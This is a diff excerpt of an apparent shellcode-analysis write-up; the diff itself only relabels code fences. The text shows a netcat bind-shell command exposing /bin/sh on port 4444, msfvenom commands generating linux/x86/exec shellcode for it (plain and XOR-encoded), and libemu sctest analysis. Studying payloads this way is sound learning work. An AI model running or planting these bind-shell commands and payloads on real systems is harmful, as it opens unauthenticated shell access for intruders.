@@ -5,7 +5,7 @@ The first will be the payload: /linux/x86/exec
 The command being executed will be: nc -nlp 4444 -e "/bin/sh" &
   - This will create a bind shell, on TCP port 4444, on all network interfaces, and then background the process.
 Testing out the command:
-```c
+```console
 root# nc -nlp 4444 -e "/bin/sh" &
 [1] 9119
 root# netstat -tnalp | grep nc
@@ -14,7 +14,7 @@ tcp        0      0 0.0.0.0:4444            0.0.0.0:*               LISTEN      
 We can see that the command successfully ran and was given the process ID 9119 and the job ID of 1.
 Using netstat we see that the process nc is successfully listening on all interfaces (0.0.0.0), on TCP port 4444.
 Since the job is running in the background, we can use the same terminal window to access our /bin/sh listening on all interfaces, by using netcat to connect to the localhost interface (127.0.0.1) on TCP port 4444.
-```c
+```console
 root# nc 127.0.0.1 4444
 id
 uid=0(root) gid=0(root) groups=0(root),46(plugdev)
@@ -22,7 +22,7 @@ uid=0(root) gid=0(root) groups=0(root),46(plugdev)
 We successfully are able to run commands with our netcat, bind shell.
 
 Now we will use msfvenom to create a shellcode to execute our netcat, bind shell command. The output will be in C so we can easily add it to our shellcode.c program.
-```c
+```console
 root# msfvenom --payload linux/x86/exec CMD='nc -nlp 4444 -e "/bin/sh" &' --format c
 Payload size: 63 bytes
 unsigned char buf[] = 
@@ -33,7 +33,7 @@ unsigned char buf[] =
 "\xe1\xcd\x80";
 ```
 This payload contains NULL bytes, rendering it useless for shellcode. We will use the builtin XOR encoder to encode our payload before we analyze it.
-```c
+```console
 root# msfvenom --payload linux/x86/exec CMD='nc -nlp 4444 -e "/bin/sh" &' --format c --encoder x86/xor_dynamic     
 x86/xor_dynamic chosen with final size 109
 Payload size: 109 bytes
@@ -49,13 +49,13 @@ unsigned char buf[] =
 ```
 Perfect, now our shellcode is NULL free. Next we will use sctest from libemu to analyze the shellcode.
 > I used my  64-bit Kali machine to create the 32-bit MSF Venom shellcode, and to analyze it with libemu. Unfortunately I could not find a trust-worthy download from the internet. Fortunately libemu is included in the kali repo.
-```c
+```console
 root# apt search libemu
 libemu2/kali-rolling,now 0.2.0+git20120122-1.2+b1 amd64 [installed,automatic]
   x86 shellcode detection and emulation
 ```
 Now that we have libemu, we will pipe our payload from msfvenom into sctest. Using sctest from libemu, we will create a visual map of how the shellcode is being executed.
-```c
+```console
 root# msfvenom --payload linux/x86/exec CMD='nc -nlp 4444 -e "/bin/sh" &' --encoder x86/xor_dynamic | sctest -Ss 10000 -vvv -G execNC.dot
 # Convert from dot to png
 root# dot -Tpng execNC.dot -o execNC.png
